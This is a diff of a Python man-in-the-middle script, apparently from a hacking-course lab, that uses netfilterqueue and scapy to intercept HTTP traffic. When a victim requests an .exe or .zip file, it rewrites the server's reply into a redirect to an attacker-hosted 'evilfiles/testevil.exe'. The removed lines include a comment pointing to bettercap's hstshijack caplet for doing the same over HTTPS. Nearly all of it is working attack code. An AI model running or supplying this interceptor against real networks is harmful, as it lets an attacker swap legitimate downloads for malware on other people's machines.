@@ -1,48 +1,72 @@
 #!/usr/bin/env python3
-
 import netfilterqueue
 import scapy.all as scapy
 
-def set_packet(packet, load):
-    new_packet = packet
-    del new_packet[scapy.IP].len
-    del new_packet[scapy.IP].chksum
-    del new_packet[scapy.TCP].chksum
-    new_packet[scapy.Raw].load = load
-
-    return new_packet
-
 ack_list = []
+
+def set_packet(scapy_packet, new_load: bytes):
+    if scapy_packet.haslayer(scapy.Raw):
+        scapy_packet[scapy.Raw].load = new_load
+    else:
+        scapy_packet = scapy_packet / scapy.Raw(new_load)
+    del scapy_packet[scapy.IP].len
+    del scapy_packet[scapy.IP].chksum
+    if scapy_packet.haslayer(scapy.TCP):
+        del scapy_packet[scapy.TCP].chksum
+    return scapy_packet
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy.Raw in scapy_packet:
+    if not scapy_packet.haslayer(scapy.TCP):
+        print("[*] Packet does not have a TCP layer")
+        packet.accept()
+        return
+    tcp_layer = scapy_packet[scapy.TCP]
+    if scapy_packet.haslayer(scapy.Raw):
+        raw_load = scapy_packet[scapy.Raw].load
         try:
-            if scapy.TCP in scapy_packet and scapy_packet[scapy.TCP].dport == 8080:  # Outgoing HTTP request
-                print("[+] HTTP packet being sent...")
-                if b".exe" in scapy_packet[scapy.Raw].load.decode() and b"192.168.119.139" not in scapy_packet[scapy.Raw].load:  # Keep load as bytes
-                    print("[+] exe request found...")
-                    ack_list.append(str(scapy_packet[scapy.TCP].ack))
-            elif scapy.TCP in scapy_packet and  scapy_packet[scapy.TCP].sport == 8080:  # Incoming HTTP response
-                if scapy_packet[scapy.TCP].seq in ack_list:
-                    ack_list.remove(scapy_packet[scapy.TCP].seq)
-                    print("[+] Replacing file...")
-                    modified_packet = set_packet(
-                        scapy_packet,
-                        b"HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.119.139/evilfiles/testevil.exe\n\n"
-                    )  # Make sure this is bytes
-                    packet.set_payload(bytes(modified_packet))  # Convert to bytes
-                    print(scapy_packet.show())
-            else:
-                print(scapy_packet[scapy.Raw].load.decode())
-                print("[+] No Packet matches filter... ")
-        except UnicodeDecodeError:
-            pass
-
+            load_str = raw_load.decode("utf-8", errors="ignore")
+        except Exception as e:
+            load_str = str(raw_load)
+        print(f"TCP Src: {tcp_layer.sport} Dst: {tcp_layer.dport}")
+        print("HTTP Payload:")
+        print(load_str)
+        if tcp_layer.dport in [80, 8080]:
+            print("[+] Outgoing HTTP request detected.")
+            if (".exe" in load_str or ".zip" in load_str) and "192.168.119.139" not in load_str:
+                print("[+] File request found; saving ACK:", tcp_layer.ack)
+                ack_list.append(tcp_layer.ack)
+        elif tcp_layer.sport in [80, 8080]:
+            if tcp_layer.seq in ack_list:
+                ack_list.remove(tcp_layer.seq)
+                print("[+] Matching HTTP response found. Redirecting file download...")
+                redirect_payload = (
+                    b"HTTP/1.1 301 Moved Permanently\r\n"
+                    b"Location: http://192.168.119.139/evilfiles/testevil.exe\r\n"
+                    b"\r\n"
+                )
+                modified_packet = set_packet(scapy_packet, redirect_payload)
+                packet.set_payload(bytes(modified_packet))
+                print(modified_packet.show())
+        else:
+            print("[+] No Packet matches filter...")
+    else:
+        print("[*] Packet does not have a Raw layer")
     packet.accept()
 
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
-queue.run()
+def main():
+    print("[*] Starting file interceptor...")
+    queue = netfilterqueue.NetfilterQueue()
+    try:
+        queue.bind(0, process_packet)
+        print("[*] Bound to netfilter queue 0. Waiting for data...")
+        queue.run()
+    except KeyboardInterrupt:
+        print("\n[*] Detected Ctrl+C... Exiting.")
+    except Exception as e:
+        print("[!] Error:", e)
+    finally:
+        queue.unbind()
 
-#to run https: bettercap -iface eth0 -caplet hstshijack/hstshijack
+if __name__ == "__main__":
+    main()
